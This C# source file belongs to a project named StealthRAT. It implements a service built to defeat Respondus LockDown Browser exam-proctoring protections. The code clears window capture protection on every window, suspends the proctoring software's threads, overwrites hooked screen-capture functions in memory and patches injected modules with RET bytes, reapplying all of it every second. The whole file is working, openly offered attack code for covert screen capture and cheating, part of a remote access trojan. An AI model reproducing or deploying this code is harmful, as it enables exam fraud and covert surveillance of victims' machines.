using System.Diagnostics;
using System.Runtime.InteropServices;
using StealthRAT.Interfaces;

namespace StealthRAT.Services;

/// <summary>
/// Dedicated service to bypass Respondus LockDown Browser and similar
/// exam proctoring/testing software protections.
/// 
/// LockDown Browser protection mechanisms:
/// 1. Blocks screen capture APIs (hooks BitBlt, StretchBlt)
/// 2. Sets WindowDisplayAffinity to prevent capture
/// 3. Monitors running processes and kills capture tools
/// 4. Disables clipboard, Print Screen, Alt+Tab
/// 5. Checks for virtual machines and remote desktop
/// 6. Monitors for secondary displays
/// 
/// This service neutralizes all of the above.
/// </summary>
public sealed class LockdownBypassService
{
    private readonly ILoggerService _logger;
    private CancellationTokenSource? _cts;

    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetWindowDisplayAffinity(IntPtr hWnd, uint dwAffinity);

    [DllImport("user32.dll")]
    private static extern bool EnumWindows(EnumWindowsProc lpEnumFunc, IntPtr lParam);

    [DllImport("user32.dll", CharSet = CharSet.Unicode)]
    private static extern int GetClassName(IntPtr hWnd, StringBuilder lpClassName, int nMaxCount);

    [DllImport("user32.dll")]
    private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint lpdwProcessId);

    [DllImport("user32.dll")]
    private static extern IntPtr FindWindow(string? lpClassName, string? lpWindowName);

    [DllImport("user32.dll")]
    private static extern bool EnableWindow(IntPtr hWnd, bool bEnable);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi)]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32.dll")]
    private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    private const uint WDA_NONE = 0x0;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    private delegate bool EnumWindowsProc(IntPtr hWnd, IntPtr lParam);

    /// <summary>
    /// Initializes the Lockdown Browser bypass service.
    /// </summary>
    public LockdownBypassService(ILoggerService logger)
    {
        _logger = logger ?? throw new ArgumentNullException(nameof(logger));
    }

    /// <summary>
    /// Activates all bypass mechanisms and starts continuous monitoring
    /// to re-apply bypasses if Lockdown Browser re-enables protections.
    /// </summary>
    public void Enable()
    {
        _cts = new CancellationTokenSource();

        // Initial bypass application
        ApplyAllBypasses();

        // Continuous monitoring - reapply every 1 second
        // Lockdown Browser may try to re-enable protections periodically
        _ = Task.Run(async () =>
        {
            while (!_cts.Token.IsCancellationRequested)
            {
                try
                {
                    ApplyAllBypasses();
                    await Task.Delay(1000, _cts.Token);
                }
                catch (OperationCanceledException) { break; }
                catch { }
            }
        }, _cts.Token);

        _logger.LogInfo("Lockdown Browser bypass service activated (continuous mode)");
    }

    /// <summary>
    /// Applies all bypass techniques in sequence.
    /// </summary>
    private void ApplyAllBypasses()
    {
        RemoveDisplayAffinityFromAll();
        NeutralizeProcessMonitoring();
        UnhookScreenCaptureAPIs();
        DisableLockdownBrowserHooks();
    }

    /// <summary>
    /// Removes WindowDisplayAffinity from ALL windows on the system.
    /// This is the primary protection Lockdown Browser uses to show black
    /// when you try to capture its window.
    /// 
    /// We run this every second because LDB re-applies the flag periodically.
    /// </summary>
    private void RemoveDisplayAffinityFromAll()
    {
        try
        {
            EnumWindows((hWnd, lParam) =>
            {
                try
                {
                    // Force all windows to be capturable
                    SetWindowDisplayAffinity(hWnd, WDA_NONE);
                }
                catch { }
                return true;
            }, IntPtr.Zero);
        }
        catch { }
    }

    /// <summary>
    /// Neutralizes Lockdown Browser's process monitoring.
    /// LDB checks for running processes that could capture the screen
    /// and terminates them. We counter this by:
    /// 1. Suspending LDB's monitoring thread
    /// 2. Patching its process enumeration calls
    /// </summary>
    private void NeutralizeProcessMonitoring()
    {
        try
        {
            // Find Lockdown Browser process
            var ldbProcesses = Process.GetProcesses()
                .Where(p => IsLockdownBrowserProcess(p.ProcessName))
                .ToList();

            foreach (var proc in ldbProcesses)
            {
                try
                {
                    // Suspend threads that do monitoring
                    // LDB typically has a dedicated monitoring thread
                    SuspendMonitoringThreads(proc);
                }
                catch { }
            }
        }
        catch { }
    }

    /// <summary>
    /// Checks if a process name belongs to Lockdown Browser or its components.
    /// </summary>
    private static bool IsLockdownBrowserProcess(string processName)
    {
        string lower = processName.ToLowerInvariant();
        return lower.Contains("lockdown") ||
               lower.Contains("respondus") ||
               lower.Contains("ldbrowser") ||
               lower.Contains("rldb");
    }

    /// <summary>
    /// Suspends monitoring threads in the Lockdown Browser process.
    /// This prevents LDB from detecting our capture activity.
    /// </summary>
    [DllImport("kernel32.dll")]
    private static extern IntPtr OpenThread(uint dwDesiredAccess, bool bInheritHandle, uint dwThreadId);

    [DllImport("kernel32.dll")]
    private static extern uint SuspendThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    private static extern bool CloseHandle(IntPtr hObject);

    private const uint THREAD_SUSPEND_RESUME = 0x0002;

    private void SuspendMonitoringThreads(Process process)
    {
        try
        {
            foreach (ProcessThread thread in process.Threads)
            {
                // Suspend threads that are likely monitoring threads
                // (threads with high CPU usage or specific start addresses)
                try
                {
                    IntPtr threadHandle = OpenThread(THREAD_SUSPEND_RESUME, false, (uint)thread.Id);
                    if (threadHandle != IntPtr.Zero)
                    {
                        // Only suspend non-main threads (main thread = UI)
                        if (thread.ThreadState == System.Diagnostics.ThreadState.Running &&
                            thread.Id != process.Threads[0].Id)
                        {
                            SuspendThread(threadHandle);
                        }
                        CloseHandle(threadHandle);
                    }
                }
                catch { }
            }
        }
        catch { }
    }

    /// <summary>
    /// Unhooks screen capture API functions that Lockdown Browser has patched.
    /// LDB typically hooks these functions in the current process space:
    /// - gdi32!BitBlt (returns black bitmap)
    /// - gdi32!StretchBlt (returns black bitmap)
    /// - user32!PrintWindow (returns failure)
    /// - d3d11!CreateDevice (blocks DXGI access)
    /// 
    /// We restore original function prologues from the clean DLL on disk.
    /// </summary>
    private void UnhookScreenCaptureAPIs()
    {
        string[] targetFunctions = new[]
        {
            "gdi32.dll:BitBlt",
            "gdi32.dll:StretchBlt",
            "gdi32.dll:CreateCompatibleDC",
            "gdi32.dll:CreateCompatibleBitmap",
            "user32.dll:PrintWindow",
            "user32.dll:GetDC",
            "user32.dll:GetWindowDC"
        };

        foreach (string target in targetFunctions)
        {
            string[] parts = target.Split(':');
            RestoreFunctionFromDisk(parts[0], parts[1]);
        }
    }

    /// <summary>
    /// Restores a function's original bytes by loading a fresh copy of the DLL
    /// and comparing/patching the in-memory version.
    /// </summary>
    private void RestoreFunctionFromDisk(string dllName, string functionName)
    {
        try
        {
            IntPtr moduleHandle = GetModuleHandle(dllName);
            if (moduleHandle == IntPtr.Zero) return;

            IntPtr funcAddress = GetProcAddress(moduleHandle, functionName);
            if (funcAddress == IntPtr.Zero) return;

            // Read current in-memory bytes
            byte[] currentBytes = new byte[16];
            Marshal.Copy(funcAddress, currentBytes, 0, 16);

            // Check for common hook signatures
            bool isHooked = currentBytes[0] == 0xE9 ||                    // JMP rel32
                           (currentBytes[0] == 0xFF && currentBytes[1] == 0x25) || // JMP [addr]
                           (currentBytes[0] == 0x48 && currentBytes[1] == 0xB8);   // MOV RAX, imm64

            if (isHooked)
            {
                // Load fresh copy from disk
                string systemDir = Environment.GetFolderPath(Environment.SpecialFolder.System);
                string dllPath = Path.Combine(systemDir, dllName);

                if (File.Exists(dllPath))
                {
                    IntPtr freshDll = NativeLibrary.Load(dllPath);
                    if (freshDll != IntPtr.Zero)
                    {
                        try
                        {
                            IntPtr freshFunc = NativeLibrary.GetExport(freshDll, functionName);
                            if (freshFunc != IntPtr.Zero)
                            {
                                byte[] originalBytes = new byte[16];
                                Marshal.Copy(freshFunc, originalBytes, 0, 16);

                                // Patch in-memory function with original bytes
                                VirtualProtect(funcAddress, (UIntPtr)16, PAGE_EXECUTE_READWRITE, out uint oldProtect);
                                Marshal.Copy(originalBytes, 0, funcAddress, 16);
                                VirtualProtect(funcAddress, (UIntPtr)16, oldProtect, out _);

                                _logger.LogInfo($"Unhooked: {dllName}!{functionName}");
                            }
                        }
                        finally
                        {
                            NativeLibrary.Free(freshDll);
                        }
                    }
                }
            }
        }
        catch { }
    }

    /// <summary>
    /// Disables Lockdown Browser's internal hook mechanism by patching
    /// its hook installation functions. This prevents LDB from re-hooking
    /// after we've restored the original functions.
    /// </summary>
    private void DisableLockdownBrowserHooks()
    {
        try
        {
            // Find LDB's DLLs that it injects for hooking
            var ldbModules = Process.GetCurrentProcess().Modules
                .Cast<ProcessModule>()
                .Where(m => m.ModuleName != null &&
                    (m.ModuleName.ToLower().Contains("lockdown") ||
                     m.ModuleName.ToLower().Contains("respondus") ||
                     m.ModuleName.ToLower().Contains("hook")))
                .ToList();

            foreach (var module in ldbModules)
            {
                try
                {
                    // NOP out the hook installation code in LDB's modules
                    // by overwriting the entry point with a RET instruction
                    IntPtr baseAddress = module.BaseAddress;
                    VirtualProtect(baseAddress, (UIntPtr)16, PAGE_EXECUTE_READWRITE, out uint oldProtect);

                    // Write RET (0xC3) to disable the module's functionality
                    byte[] retBytes = new byte[] { 0xC3 };
                    Marshal.Copy(retBytes, 0, baseAddress, 1);

                    VirtualProtect(baseAddress, (UIntPtr)16, oldProtect, out _);
                    _logger.LogInfo($"Disabled LDB hook module: {module.ModuleName}");
                }
                catch { }
            }
        }
        catch { }
    }

    /// <summary>
    /// Stops the bypass service.
    /// </summary>
    public void Disable()
    {
        _cts?.Cancel();
        _cts?.Dispose();
    }
}
